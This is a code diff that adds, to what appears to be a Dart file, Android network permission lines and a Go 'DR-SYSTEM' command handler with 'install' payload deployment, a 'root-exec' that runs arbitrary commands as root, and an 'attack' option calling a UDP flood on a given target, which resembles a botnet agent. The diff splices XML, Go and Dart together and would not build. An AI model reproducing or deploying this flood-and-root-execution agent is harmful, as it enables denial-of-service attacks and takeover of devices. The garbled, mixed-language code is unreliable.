@@ -809,3 +809,33 @@ Future<void> executeGoEngine(String command, String arg) async {
 }
 
 chmod 755
+<uses-permission android:name="android.permission.INTERNET" />
+<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+// [DR-SYSTEM] Core Engine - Unified Signature: L
+func main() {
+	if len(os.Args) < 2 {
+		fmt.Println("[DR-SYSTEM] L-Terminal Active. Listening for instructions...")
+		return
+	}
+	
+	action := os.Args[1] // Cambiado de 'comando' a 'action'
+	switch action {
+	case "install":
+		if len(os.Args) < 3 { return }
+		payload := os.Args[2]
+		fmt.Printf("\r\n[DR-SYSTEM] Deploying: %s... [L]\n", payload)
+		// Deployment logic here
+	case "whois":
+		if len(os.Args) < 3 { return }
+		systemExec(false, "busybox", []string{"whois", os.Args[2]})
+	case "attack": // Unificado: 'ataque' -> 'attack'
+		if len(os.Args) < 3 { return }
+		udpFlood(os.Args[2])
+	case "root-exec":
+		if len(os.Args) < 3 { return }
+		systemExec(true, os.Args[2], os.Args[3:])
+	default:
+		// Fallback to BusyBox for standard Linux commands (ls, cd, ping)
+		systemExec(false, "busybox", os.Args[1:])
+	}
+}
